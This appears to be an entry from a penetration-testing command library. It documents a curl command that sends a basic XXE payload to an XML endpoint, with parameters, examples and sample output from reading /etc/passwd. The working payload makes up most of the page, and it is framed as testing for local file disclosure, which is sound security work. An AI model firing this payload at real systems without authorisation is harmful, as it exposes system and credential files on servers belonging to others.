---
id: e3c0fa4d-38b7-41b7-a750-b7e1f2816faa
name: curl-send-basic-xxe-payload
type: command
executor: bash
data: >-
  curl -X POST $_TARGET_URL -H "Content-Type: application/xml" -d '<?xml
  version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "file://$_FILE_PATH">]><foo>&xxe;</foo>'
output: null
created_at: '2023-04-06T03:56:44.075339+00:00'
updated_at: '2023-04-10T20:24:39.937276+00:00'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - testing
verified: true
validated: true
---

# curl-send-basic-xxe-payload

## Command

```bash
curl -X POST $_TARGET_URL -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://$_FILE_PATH">]><foo>&xxe;</foo>'
```

## Description

This command sends a basic XXE payload via curl to test for local file disclosure vulnerabilities in XML-parsing endpoints. It defines an external entity that reads a system file and includes it in the XML response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The endpoint URL accepting XML (e.g., http://target.com/api) | Yes |
| $_FILE_PATH | Path to the file to disclose (e.g., /etc/passwd on Linux, C:/Windows/win.ini on Windows) | Yes |
| -X POST | Specifies HTTP POST method | Built-in |
| -H "Content-Type: application/xml" | Sets XML content type header | Built-in |
| -d | Provides the XML payload data | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Advanced Usage (with silent output)

```bash
curl -s -X POST http://target.com/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' | grep root
```

## Expected Output

If vulnerable, the response body includes file contents:
```
<foo>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</foo>
```
If not vulnerable, expect parsing error or empty <foo></foo>.

## Related

- [[procedures/Detect-and-Mitigate-XXE-Injection]]
- [[commands/curl-send-out-of-band-xxe-payload]]
